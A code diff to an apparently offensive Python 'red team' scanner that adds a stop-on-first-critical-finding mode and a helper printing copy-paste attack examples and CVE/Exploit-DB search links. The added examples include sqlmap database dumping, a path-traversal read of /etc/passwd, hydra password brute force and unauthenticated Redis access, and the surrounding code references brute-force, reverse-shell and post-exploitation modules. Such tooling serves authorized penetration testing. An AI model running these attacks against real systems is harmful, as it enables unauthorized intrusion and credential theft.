@@ -37,7 +37,8 @@ import json
 import datetime
 import ftplib
 import threading
-from urllib.parse import urlencode
+from urllib.parse import urlencode, quote
+import webbrowser
 
 # ── Optional imports ──────────────────────────────────────
 try:
@@ -69,6 +70,12 @@ class C:
     RESET  = "\033[0m"
 
 # ─────────────────────────────────────────────────────────
+#  STOP ON FIRST VULN (CRITICAL/HIGH)
+# ─────────────────────────────────────────────────────────
+STOP_ON_VULN = True
+STOP_SEVERITIES = ("CRITICAL", "HIGH")
+
+# ─────────────────────────────────────────────────────────
 #  GLOBAL REPORT STORAGE
 # ─────────────────────────────────────────────────────────
 REPORT = {
@@ -97,6 +104,8 @@ def add_vuln(severity, title, description, exploit_hint):
         "description": description,
         "exploit_hint": exploit_hint
     })
+    if STOP_ON_VULN and severity in STOP_SEVERITIES:
+        REPORT["stop_requested"] = True
 
 # ─────────────────────────────────────────────────────────
 #  HELPERS
@@ -1031,7 +1040,7 @@ def http_brute(target, open_ports):
     if not HAS_REQUESTS:
         return
 
-    web_ports = [p for p in open_ports if p in [80, 443, 8080]]
+    web_ports = [p for p in open_ports if p in [80, 443, 8080, 8443]]
     if not web_ports:
         return
 
@@ -1051,8 +1060,8 @@ def http_brute(target, open_ports):
         "  Burp Suite Intruder → Cluster bomb attack")
 
     for port in web_ports:
-        scheme = "https" if port == 443 else "http"
-        base = f"{scheme}://{target}" if port in [80, 443] else f"{scheme}://{target}:{port}"
+        scheme = "https" if port in (443, 8443) else "http"
+        base = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
 
         login_endpoints = [
             ("/login.php",        {"username": "USER", "password": "PASS"}),
@@ -1093,7 +1102,7 @@ def http_brute(target, open_ports):
     # Command → Manual steps → Troubleshooting (HTTP login)
     # Prefer standard ports 80 then 443 for the printed URL (not iteration order)
     first_web_port = 80 if 80 in web_ports else (443 if 443 in web_ports else next(iter(web_ports)))
-    scheme = "https" if first_web_port == 443 else "http"
+    scheme = "https" if first_web_port in (443, 8443) else "http"
     base_http = f"{scheme}://{target}" if first_web_port in (80, 443) else f"{scheme}://{target}:{first_web_port}"
     print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  hydra -L users.txt -P pass.txt {base_http}/login.php http-post-form \"username=^USER^&password=^PASS^:Invalid\"")
     manual_steps("How to do it manually (HTTP login brute)", [
@@ -1726,6 +1735,7 @@ def generate_html_report(target):
 
     filename = f"redteam_report_{target.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
     filepath = f"/mnt/user-data/outputs/{filename}"
+    os.makedirs(os.path.dirname(filepath), exist_ok=True)
     with open(filepath, "w") as f:
         f.write(html)
 
@@ -1770,6 +1780,72 @@ def final_summary(target):
 
 
 # ─────────────────────────────────────────────────────────
+#  STOP ON VULN: MANUAL GUIDE + CVE SEARCH
+# ─────────────────────────────────────────────────────────
+# Optional extra example per vuln type (title substring -> one copy-pastable line)
+VULN_EXAMPLE_BY_TITLE = {
+    "SQL Injection": "sqlmap -u 'http://TARGET/login.php' --data='user=a&pass=b' --dbs --batch",
+    "LFI": "http://TARGET/page.php?file=../../../../etc/passwd",
+    "Local File Inclusion": "http://TARGET/page.php?file=../../../../etc/passwd",
+    "SSH Default": "ssh admin@TARGET",
+    "FTP Anonymous": "ftp TARGET  # login: anonymous, password: (empty)",
+    "FTP Weak": "ftp TARGET  # use credentials found above",
+    "HTTP Weak": "hydra -l admin -P rockyou.txt http://TARGET/login.php http-post-form \"user=^USER^:pass=^PASS^:Invalid\"",
+    "Redis Unauthenticated": "redis-cli -h TARGET  # then INFO, KEYS *",
+}
+
+
+def on_vuln_stop(target):
+    """Called when scan stops on first CRITICAL/HIGH vuln: show what we found, how to try it yourself, and CVE search."""
+    vulns_stop = [v for v in REPORT["vulnerabilities"] if v["severity"] in STOP_SEVERITIES]
+    if not vulns_stop:
+        return
+    vuln = vulns_stop[-1]
+    title = vuln["title"]
+    description = vuln["description"]
+    exploit_hint = vuln["exploit_hint"]
+
+    print(f"\n{C.RED}{C.BOLD}{'═'*62}")
+    print("  VULNERABILITY FOUND — Stopping on first finding")
+    print(f"{'═'*62}{C.RESET}\n")
+
+    print(f"  {C.CYAN}{C.BOLD}What we found:{C.RESET}")
+    print(f"  {C.BOLD}{title}{C.RESET}")
+    print(f"  {C.DIM}{description}{C.RESET}")
+    print(f"  {C.GREEN}Exploit hint:{C.RESET} {exploit_hint}\n")
+
+    print(f"  {C.CYAN}{C.BOLD}Try it yourself:{C.RESET}")
+    manual_steps("Copy-paste and adapt", [
+        exploit_hint,
+    ])
+    extra_example = None
+    for key, example in VULN_EXAMPLE_BY_TITLE.items():
+        if key in title:
+            extra_example = example.replace("TARGET", target)
+            break
+    if extra_example:
+        tip(f"Example: {extra_example}")
+
+    query_nvd = f"{title} CVE"
+    query_edb = title
+    nvd_url = f"https://nvd.nist.gov/vuln/search/results?query={quote(query_nvd)}"
+    edb_url = f"https://www.exploit-db.com/search?q={quote(query_edb)}"
+
+    print(f"  {C.CYAN}{C.BOLD}Search for CVEs / exploits online:{C.RESET}")
+    print(f"  NVD (CVE):       {nvd_url}")
+    print(f"  Exploit-DB:      {edb_url}")
+    print(f"  {C.DIM}Open in browser to search for CVEs and public exploits.{C.RESET}\n")
+
+    try:
+        ans = input(f"  {C.BOLD}Open CVE search in browser? (y/n): {C.RESET}").strip().lower()
+        if ans == "y" or ans == "yes":
+            webbrowser.open(nvd_url)
+            webbrowser.open(edb_url)
+    except (EOFError, KeyboardInterrupt):
+        pass
+
+
+# ─────────────────────────────────────────────────────────
 #  MAIN
 # ─────────────────────────────────────────────────────────
 def main():
@@ -1789,21 +1865,73 @@ def main():
         print("  Smart choice. Always get authorization first!")
         sys.exit(0)
 
-    # ── Run all modules ───────────────────────────────────
+    # ── Run all modules (stop on first CRITICAL/HIGH vuln if STOP_ON_VULN) ──
     try:
         host_discovery(target)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         open_ports = port_scan(target)
-        banners    = banner_grab(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
+        banners = banner_grab(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         check_ftp(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         web_enumeration(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         sqli_check(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         xss_check(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         lfi_check(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         ssh_brute(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         ftp_brute(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         http_brute(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         smb_check(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         check_other_services(target, open_ports)
+        if REPORT.get("stop_requested"):
+            on_vuln_stop(target)
+            generate_html_report(target)
+            sys.exit(0)
         reverse_shell_generator(target)
         post_exploitation_guide()
         final_summary(target)
